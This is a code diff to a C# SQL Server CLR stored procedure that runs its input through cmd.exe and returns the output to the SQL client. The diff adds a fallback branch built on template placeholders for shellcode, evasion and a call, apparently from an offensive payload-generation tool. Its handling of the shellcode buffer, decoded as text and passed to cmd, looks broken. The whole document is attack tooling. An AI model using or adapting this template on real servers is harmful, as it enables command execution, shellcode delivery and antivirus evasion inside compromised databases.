@@ -21,19 +21,30 @@ public partial class StoredProcedures
     {
         //####EVASION####
         
+        // Handle both text and binary input
+        if (cmd.IsNull || string.IsNullOrEmpty(cmd.Value))
+        {
+            byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
+            //####CALL####
+            cmd = new SqlString(Encoding.UTF8.GetString(buf));
+        }
+        
         Process proc = new Process();
         proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
         proc.StartInfo.Arguments = string.Format(@" /C {0}", cmd.Value);
         proc.StartInfo.UseShellExecute = false;
         proc.StartInfo.RedirectStandardOutput = true;
         proc.Start();
+        
         // Create the record and specify the metadata for the columns.
         SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
         
         // Mark the beginning of the result set.
         SqlContext.Pipe.SendResultsStart(record);
+        
         // Set values for each column in the row
         record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+        
         // Send the row back to the client.
         SqlContext.Pipe.SendResultsRow(record);
         
